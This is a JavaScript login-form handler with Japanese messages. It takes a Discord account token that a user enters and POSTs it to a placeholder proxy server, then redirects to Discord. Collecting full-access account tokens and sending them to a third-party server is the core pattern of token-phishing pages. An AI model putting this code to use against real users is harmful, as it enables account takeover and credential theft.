document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const token = document.getElementById('token').value;
    fetch('https://your-proxy-server-url/proxy', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            token: token
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('ログインに成功しました！');
            window.location.href = 'https://discord.com/channels/@me';
        } else {
            alert('ログインに失敗しました。トークンを確認してください。');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('ログイン中にエラーが発生しました。');
    });
});
